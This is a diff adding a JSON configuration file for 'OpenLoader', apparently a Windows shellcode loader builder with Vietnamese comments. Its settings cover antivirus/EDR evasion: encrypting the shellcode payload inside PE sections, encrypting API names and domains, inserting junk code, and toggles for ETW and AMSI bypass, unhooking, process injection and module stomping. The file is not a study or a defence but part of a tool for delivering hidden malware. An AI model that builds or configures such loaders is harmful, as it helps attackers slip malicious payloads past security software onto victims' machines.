@@ -1,0 +1,74 @@
+{
+  "_comment": "OpenLoader Config — chi tiet tung feature",
+
+  "project": {
+    "name": "OpenLoader",
+    "version": "1.0.0",
+    "target_arch": "x64",
+    "target_os": "windows"
+  },
+
+  "modules": {
+    "_comment": "Bat/tat tung layer",
+    "bypass_static": true,
+    "bypass_etw": false,
+    "bypass_amsi": false,
+    "bypass_unhook": false,
+    "inject_process": true,
+    "inject_stomp": false
+  },
+
+  "static": {
+    "_comment": "Layer 1: Static AV/EDR evasion",
+
+    "encryption": {
+      "_comment": "Mã hóa payload (shellcode)",
+      "enabled": true,
+      "algorithm": "xor",
+      "_algorithm_options": ["xor", "aes"],
+      "key": "random",
+      "_key_options": "hex string hoac 'random' de tu sinh",
+      "payload_section": ".rsrc",
+      "_payload_section_options": [".rsrc", ".data", ".text"]
+    },
+
+    "string_encryption": {
+      "_comment": "Mã hóa chuỗi (API names, domains, paths)",
+      "enabled": true,
+      "algorithm": "xor",
+      "_algorithm_options": ["xor", "aes"],
+      "key": "random",
+      "_key_options": "hex string hoac 'random'"
+    },
+
+    "dead_code": {
+      "_comment": "Chèn mã rác / NOP",
+      "enabled": true,
+      "density": "medium",
+      "_density_options": ["low", "medium", "high"],
+      "type": "mixed",
+      "_type_options": ["nop", "junk", "mixed"]
+    }
+  },
+
+  "output": {
+    "_comment": "Output options",
+    "format": "exe",
+    "_format_options": ["exe", "dll"],
+    "filename": "loader"
+  },
+
+  "build": {
+    "compiler": "gcc",
+    "c++_standard": 17,
+    "optimization": "size",
+    "strip_symbols": true,
+    "position_independent": true
+  },
+
+  "shellcode": {
+    "_comment": "Shellcode input auto-find",
+    "dir": "shellcode",
+    "_comment2": "Neu -i ko co, tu dong tim trong dir nay"
+  }
+}
